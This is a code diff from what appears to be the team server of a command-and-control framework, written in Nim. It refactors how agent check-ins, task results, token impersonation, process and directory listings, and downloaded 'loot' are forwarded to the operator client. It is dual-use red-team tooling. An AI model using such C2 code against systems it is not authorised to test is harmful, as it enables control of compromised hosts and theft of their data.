@@ -36,8 +36,8 @@ proc register*(registrationData: seq[byte], remoteAddress: string): bool {.disca
             cq.info("Agent ", fgYellow, styleBright, agent.agentId, resetStyle, " connected to listener ", fgGreen, styleBright, agent.listenerId, resetStyle, ": ", fgYellow, styleBright, fmt"{agent.username}@{agent.hostname}", "\n") 
             
             # Send new agent to client
-            cq.client.sendAgent(agent)
-            cq.client.sendEventlogItem(LOG_INFO_SHORT, fmt"Agent {agent.agentId} connected to listener {agent.listenerId}.")
+            cq.sendAgent(agent)
+            cq.sendEventlogItem(LOG_INFO_SHORT, fmt"Agent {agent.agentId} connected to listener {agent.listenerId}.")
             return true
         
         except CatchableError as err:
@@ -65,7 +65,7 @@ proc getTasks*(heartbeat: seq[byte]): Table[string, seq[seq[byte]]] =
 
         # Update the last check-in date for the accessed agent
         cq.agents[agentId].latestCheckin = cast[int64](timestamp)
-        cq.client.sendAgentCheckin(agentId)
+        cq.sendAgentCheckin(agentId)
 
         # Return tasks
         var tasks = initTable[string, seq[seq[byte]]]()
@@ -81,7 +81,7 @@ proc getTasks*(heartbeat: seq[byte]): Table[string, seq[seq[byte]]] =
 
             # Recursively collect tasks for linked agents
             for linkedAgentId in cq.agents[agentId].links:
-                cq.client.sendAgentCheckin(linkedAgentId)
+                cq.sendAgentCheckin(linkedAgentId)
                 collectTasks(linkedAgentId) 
 
             # Clear task queue
@@ -102,13 +102,13 @@ proc handleResult*(resultData: seq[byte]) =
             
             let silent = (taskResult.header.flags and cast[uint16](FLAG_SILENT)) != 0
 
-            cq.client.sendConsoleItem(agentId, LOG_INFO, fmt"{$resultData.len} bytes received.", silent)
+            cq.sendConsoleItem(agentId, LOG_INFO, fmt"{$resultData.len} bytes received.", silent)
             cq.info(fmt"{$resultData.len} bytes received.")
             
             # Update task queue to include all tasks, except the one that was just completed
             case cast[StatusType](taskResult.status):
             of STATUS_COMPLETED:
-                cq.client.sendConsoleItem(agentId, LOG_SUCCESS, fmt"Task {taskId} completed.", silent)
+                cq.sendConsoleItem(agentId, LOG_SUCCESS, fmt"Task {taskId} completed.", silent)
                 cq.success(fmt"Task {taskId} completed.")
                 cq.agents[agentId].tasks = cq.agents[agentId].tasks.filterIt(it.taskId != taskResult.taskId)
 
@@ -118,18 +118,18 @@ proc handleResult*(resultData: seq[byte]) =
                     let impersonationToken: string = Bytes.toString(taskResult.data).split(" ", 1)[1..^1].join(" ")[0..^2]   # Remove trailing '.' character from the domain\username string
                     if cq.dbUpdateTokenImpersonation(agentId, impersonationToken):
                         cq.agents[agentId].impersonationToken = impersonationToken
-                        cq.client.sendImpersonateToken(agentId, impersonationToken) 
+                        cq.sendImpersonateToken(agentId, impersonationToken) 
                 of CMD_REV2SELF:
                     if cq.dbUpdateTokenImpersonation(agentId, ""):
                         cq.agents[agentId].impersonationToken.setLen(0)
-                        cq.client.sendRevertToken(agentId)
+                        cq.sendRevertToken(agentId)
                 of CMD_CD, CMD_PWD: 
-                    cq.client.sendWorkingDirectory(agentId, Bytes.toString(taskResult.data))
+                    cq.sendWorkingDirectory(agentId, Bytes.toString(taskResult.data))
 
                 else: discard
 
             of STATUS_FAILED: 
-                cq.client.sendConsoleItem(agentId, LOG_ERROR, fmt"Task {taskId} failed.", silent)
+                cq.sendConsoleItem(agentId, LOG_ERROR, fmt"Task {taskId} failed.", silent)
                 cq.error(fmt"Task {taskId} failed.")
                 cq.agents[agentId].tasks = cq.agents[agentId].tasks.filterIt(it.taskId != taskResult.taskId)
             of STATUS_IN_PROGRESS: 
@@ -138,8 +138,8 @@ proc handleResult*(resultData: seq[byte]) =
             case cast[ResultType](taskResult.resultType):
             of RESULT_STRING:
                 if int(taskResult.length) > 0:
-                    cq.client.sendConsoleItem(agentId, LOG_INFO, "Output:", silent) 
-                    cq.client.sendConsoleItem(agentId, LOG_OUTPUT, Bytes.toString(taskResult.data), silent)
+                    cq.sendConsoleItem(agentId, LOG_INFO, "Output:", silent) 
+                    cq.sendConsoleItem(agentId, LOG_OUTPUT, Bytes.toString(taskResult.data), silent)
 
             of RESULT_BINARY:
                 # Write binary data to a file 
@@ -169,16 +169,16 @@ proc handleResult*(resultData: seq[byte]) =
 
                 # Send loot to client to display file/screenshot in the UI
                 discard cq.dbStoreLoot(lootItem)
-                cq.client.sendLoot(lootItem)
+                cq.sendLoot(lootItem)
 
                 cq.output(fmt"File downloaded to {downloadPath} ({$fileData.len()} bytes).", "\n")
-                cq.client.sendConsoleItem(agentId, LOG_OUTPUT, fmt"File downloaded to {downloadPath} ({$fileData.len()} bytes).", silent)
+                cq.sendConsoleItem(agentId, LOG_OUTPUT, fmt"File downloaded to {downloadPath} ({$fileData.len()} bytes).", silent)
             
             of RESULT_PROCESSES: 
-                cq.client.sendProcessList(agentId, Bytes.toString(taskResult.data), silent)
+                cq.sendProcessList(agentId, Bytes.toString(taskResult.data), silent)
 
             of RESULT_DIRECTORY_LISTING: 
-                cq.client.sendDirectoryListing(agentId, Bytes.toString(taskResult.data), silent)
+                cq.sendDirectoryListing(agentId, Bytes.toString(taskResult.data), silent)
 
             of RESULT_LINK: 
                 # When an SMB agent is linked, the registration data is sent as the task result of the 'link' command
@@ -205,7 +205,7 @@ proc handleResult*(resultData: seq[byte]) =
             else: discard 
 
             # Send newline to separate commands
-            cq.client.sendConsoleItem(agentId, LOG_OUTPUT, "", silent)
+            cq.sendConsoleItem(agentId, LOG_OUTPUT, "", silent)
             
         except CatchableError as err:
             cq.error(err.msg, "\n")  
